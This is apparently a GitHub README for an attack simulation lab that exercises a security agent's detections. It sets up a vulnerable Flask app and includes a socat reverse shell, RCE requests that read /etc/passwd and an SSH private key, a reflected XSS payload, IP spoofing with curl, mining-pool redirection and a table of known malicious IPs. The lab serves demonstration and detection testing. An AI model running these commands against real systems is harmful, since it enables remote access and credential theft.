# 🧪 Attack Simulation Lab

This demo simulates various types of attacks within your **own VPC environment**. It includes Remote Command Execution, Reflected XSS, IP Spoofing, and simulates known bad IP behavior. **For educational and demonstration purposes only.**

![image](https://github.com/user-attachments/assets/16d33c34-aa16-4880-8544-c2d1c8d113e6)


---

## 🛠️ Preparations

git clone https://github.com/svuillaume/demo_simulator

### 1. Launch Two VMs
- **Attacker VM**
- **Victim VM**

---

## 🧰 Attacker VM Setup

1. **Install Docker**
2. **Deploy Lacework Agent**

---

## 🎯 Victim VM Setup

1. **Install dependencies**
   ```bash
   sudo apt update
   sudo apt install python3 python3-pip -y
   pip3 install flask
   ```

2. **Set up the attack simulation script**
   ```bash
   chmod +x demo_simulator/lw_attack_sim.sh
   ```

3. **Update crypto pools in the script**  
   Use custom pool URLs:
   - `evil.v2.xmrig.com`
   - `donate.v2.xmrig.com`

4. **Edit `/etc/hosts` to redirect mining pools to attacker**
   ```plaintext
   127.0.0.1 localhost
   <Attacker-IP> donate.v2.xmrig.com
   ```

5. **Run the Flask application**
   ```bash
   python3 app.py
   ```

---

## ▶️ Running the Simulation

### On the Attacker VM (Open 2 Terminals or use screen)

sudo apt install screen    # Debian/Ubuntu
sudo yum install screen    # RHEL/CentOS


**Create a persistent socket listener on Terminal 1 or screen 1:**
```bash
nc -k -l 3333 &
```
**Create a new socat tcp listener on tcp 5555**

```bash
socat file:`tty`,raw,echo=0 tcp-listen:5555
```

**Run traffic simulation with k6 on Terminal 2 or screen 2:**
```bash
sudo docker run --rm -v $(pwd):/scripts grafana/k6 run /scripts/k6.js
```

---

### On the Victim VM

**Run the attack simulation script:**
```bash
./demo_simulator/lw_attack_sim.sh
```

**Intiate an interactive Reverse Shell**
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.31.30.103:5555
```
---

## 🚀 HOWTO Use the Demo


On the Attacker VM, run K6.js and owasp_attack.sh

> ⚠️ **IMPORTANT:** All tests must be run within your **own VPC lab environment**.

### 🔓 Remote Command Execution (RCE)

Submit OS commands via the vulnerable Flask app:

***(aws ALB) http://samv-alb-1759994858.ca-central-1.elb.amazonaws.com:5000/***

```bash
http://samv-alb-1759994858.ca-central-1.elb.amazonaws.com:5000/cmd?exec=cat%20/etc/passwd
http://samv-alb-1759994858.ca-central-1.elb.amazonaws.com:5000/cmd?exec=cat%20/.ssh/id_rsa
```
---

### 💬 Reflected XSS

Test for reflected XSS using the greet endpoint:

- [Greet](http://<victim_IP>:5000/greet)

**Example:**
```
http://<victim_IP>:5000/greet?name=<script>alert('GotYou :)')</script>
```

---

### 🌐 Client IP Logging

Test client IP extraction:

- [Client IP](http://<victim_IP>:5000/client-ip)

**Spoof IP via curl:**
```bash
curl -H "X-Forwarded-For: 1.2.3.4" http://<victim_IP>:5000/client-ip
```

---

## 🚨 Known Bad IPs for Simulation (Use with Caution)

| IP Address       | Description                                   |
|------------------|-----------------------------------------------|
| `45.227.253.55`  | Malware C2 - AbuseIPDB                        |
| `185.220.101.1`  | Tor exit node (flagged)                       |
| `1.3.3.7`        | Red team/meme IP                              |
| `222.186.30.50`  | Brute-force attacker (common honeypot source) |
| `89.248.167.131` | Blacklisted scanner (abuse reports)           |
| `23.129.64.50`   | Tor exit node - flagged in feeds              |

> ⚠️ **Do NOT scan or connect to these IPs from outside your VPC. Use only for simulation/logging tests.**

---

## ✅ You're now ready to simulate attacks!
Happy testing — use responsibly in isolated environments.

